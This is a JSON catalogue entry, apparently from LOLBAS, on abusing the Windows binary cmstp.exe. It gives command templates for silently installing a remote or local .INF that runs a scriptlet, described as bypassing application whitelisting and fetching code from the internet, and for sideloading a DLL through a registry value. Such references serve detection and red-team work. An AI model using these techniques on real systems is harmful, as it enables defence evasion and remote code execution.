{"title": "Cmstp.exe", "source": "lolbas", "source_label": "LOLBAS", "path": "cmstp", "html": "<h1>Cmstp.exe</h1>\n<p>Installs or removes a Connection Manager service profile.</p>\n<h2>AWL Bypass</h2>\n<p>Execute code hidden within an inf file. Execute code directly from Internet.</p>\n<pre><code class=\"language-powershell\">cmstp.exe /ni /s {REMOTEURL:.inf}</code></pre>\n<p>Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. &mdash; <strong>MITRE:</strong> T1218.003 &mdash; <strong>Privileges:</strong> User</p>\n<h2>Execute</h2>\n<p>Execute code hidden within an inf file. Download and run scriptlets from internet.</p>\n<pre><code class=\"language-powershell\">cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}</code></pre>\n<p>Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. &mdash; <strong>MITRE:</strong> T1218.003 &mdash; <strong>Privileges:</strong> User</p>\n<p>Proxy execution of a malicious DLL via registry modification.</p>\n<pre><code class=\"language-powershell\">cmstp.exe /nf</code></pre>\n<p>cmstp.exe reads the `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`. &mdash; <strong>MITRE:</strong> T1218.003 &mdash; <strong>Privileges:</strong> Administrator</p>", "excerpt": "Cmstp.exe Installs or removes a Connection Manager service profile. AWL Bypass Execute code hidden within an inf file. Execute code directly from Internet. cmstp.exe /ni /s {REMOTEURL:.inf} Silently installs a specially formatted remote .INF without…", "tags": ["Execute", "AWL Bypass"]}